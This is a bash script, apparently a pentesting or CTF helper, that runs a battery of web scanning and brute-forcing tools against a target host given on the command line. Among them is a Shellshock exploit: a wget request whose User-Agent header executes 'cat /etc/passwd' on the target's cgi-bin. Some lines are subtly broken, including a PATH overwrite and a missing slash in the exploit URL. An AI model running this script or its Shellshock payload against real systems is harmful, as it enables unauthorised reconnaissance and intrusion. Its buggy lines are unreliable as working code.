#!/bin/bash          

IP=$1
LOGFILE=$1_http_scan.log   
PORT=${2:-80}
PATH=$3
export PATH=$PATH:/usr/bin

if [ -z "$IP" -o -z "$PORT" ]
then
  echo "Usage: $0 host [port]"
  echo "port defaults to 80."
  exit 1
fi

http_path=/usr/bin/httprint
dmitry_path=/usr/bin/dmitry
whatweb_path=/usr/bin/whatweb
amap_path=/usr/bin/amap
uniscan_path=/usr/bin/uniscan
fimap_path=/usr/bin/fimap
dirb_path=/usr/bin/dirb
wfuzz_path=/usr/bin/wfuzz
sqlmap_path=/usr/bin/sqlmap
dotdotpwn_path=/usr/sbin/dotdotpwn.pl
nikto_path=/usr/bin/nikto
gobuster_path=/usr/bin/gobuster
sslscan_path=/usr/bin/sslscan
curl_path=/usr/bin/curl
skipfish_path=/usr/bin/skipfish

if [[ "$IP" != "yes" ]]
then
$curl_path -i -L $IP
$curl_path $IP/robots.txt -s | html2text
$curl_path $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" "http://"$IP"cgi-bin/status"
$nikto_path -e 1 -host http://$IP:$PORT
#wget http://www.net-square.com/signature.txt
#$http_path -h $IP:$PORT -s signature.txt
$dmitry_path -p -b $IP:$PORT
$whatweb_path -v $IP:$PORT
#nmap -sSV -P0 $IP >> $LOGFILE
$amap_path -bvq $IP $PORT
#$uniscan_path -u http://$IP:$PORT/ -qd
$fimap_path -u "http://$IP:$PORT/"
#$skipfish_path -o $IP http://$IP:$PORT/
$gobuster_path -u http://$IP:$PORT/ -w /usr/share/wfuzz/wordlist/general/big.txt -s '200,204,301,302,307,403,500' -e
#$sslscan_path $IP:443
$dirb_path http://$IP:$PORT/ /usr/share/wordlists/dirb/big.txt
$wfuzz_path -c -v -w wordlist/general/big.txt --hc 404 $IP:$PORT
#$dotdotpwn_path -m http -h $IP:$PORT >> $LOGFILE
cutycapt --url=http://$IP/index.html --out=$IP-index.html.jpg
#cadaver http://$IP:$PORT/$PATH
fi

